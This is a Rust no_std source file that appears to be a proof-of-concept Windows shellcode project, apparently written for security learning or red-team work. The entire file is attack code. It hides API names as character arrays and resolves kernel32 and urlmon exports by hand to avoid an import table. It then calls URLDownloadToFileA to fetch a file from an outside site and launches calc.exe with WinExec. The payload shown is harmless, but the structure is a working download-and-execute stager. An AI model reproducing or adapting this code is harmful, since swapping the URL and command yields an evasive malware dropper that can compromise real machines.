#![no_main]
#![no_std]

use core::{arch::asm, mem::transmute, panic::PanicInfo, ptr::{null, null_mut}};

use resolver::{c_void, get_function_from_exports, DWORD, LONG, LPCSTR, PVOID};

mod resolver;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

pub type WinExec = extern "system" fn(lpCmdLine: LPCSTR, uCmdShow: u32) -> u32;
pub type LoadLibraryA = extern "system" fn(lpFileName: LPCSTR) -> PVOID;
pub type URLDownloadToFile = extern "system" fn(pCaller: *mut c_void, szURL: LPCSTR, szFileName: LPCSTR, reserved: DWORD, lpfnCB: *mut c_void) -> LONG;

#[no_mangle]
pub extern "system" fn main() {
    
    unsafe {
        // clean argc and argv
        asm!("mov rcx, 0", "mov rdx, 0");
        // asm!("and rsp, ~0xf");
    }

    let k32: &[u16] = &[
        'K' as u16,
        'E' as u16,
        'R' as u16,
        'N' as u16,
        'E' as u16,
        'L' as u16,
        '3' as u16,
        '2' as u16,
        '.' as u16,
        'D' as u16,
        'L' as u16,
        'L' as u16,
        0u16,
    ];

    let win_exec_str: &[u8] = &[
        'W' as u8,
        'i' as u8,
        'n' as u8,
        'E' as u8,
        'x' as u8,
        'e' as u8,
        'c' as u8,
        0u8,
    ];

    let load_library_str: &[u8] = &[
        'L' as u8,
        'o' as u8,
        'a' as u8,
        'd' as u8,
        'L' as u8,
        'i' as u8,
        'b' as u8,
        'r' as u8,
        'a' as u8,
        'r' as u8,
        'y' as u8,
        'A' as u8,
        0u8,
    ];

    let urlmon_str: &[u16] = &[
        'u' as u16,
        'r' as u16,
        'l' as u16,
        'm' as u16,
        'o' as u16,
        'n' as u16,
        '.' as u16,
        'd' as u16,
        'l' as u16,
        'l' as u16,
        0u16,
    ];

    let k32_base_addr = resolver::get_dll_base(k32.as_ptr());

    let win_exec_fn_addr = get_function_from_exports(k32_base_addr, win_exec_str.as_ptr());
    let load_library_fn_addr = get_function_from_exports(k32_base_addr, load_library_str.as_ptr());

    let LoadLibraryA: LoadLibraryA = unsafe { transmute(load_library_fn_addr) };
    let load_library_result =  LoadLibraryA("urlmon.dll\0".as_ptr() as *const i8);
    
    let urlmon_base_addr = resolver::get_dll_base(urlmon_str.as_ptr());
    let URLDownloadToFileFnAddr = get_function_from_exports(urlmon_base_addr, "URLDownloadToFileA\0".as_ptr());

    // URLDownloadToFile
    let URLDownloadToFile: URLDownloadToFile = unsafe { transmute(URLDownloadToFileFnAddr) };
    let url = "https://fluxsec.red/sitemap.xml\0";
    let file_name = "C:\\Users\\ian\\git\\rust_shellcode\\shellcode\\test_file.xml\0";
    
    let result = URLDownloadToFile(null_mut(), url.as_ptr() as *const i8, file_name.as_ptr() as *const i8, 0, null_mut());
    if result != 0 {
        unsafe { asm!("int3") };
        return;
    }

    let WinExec: WinExec = unsafe { transmute(win_exec_fn_addr) };
    WinExec("calc.exe\0" as *const _ as *const i8, 1);
}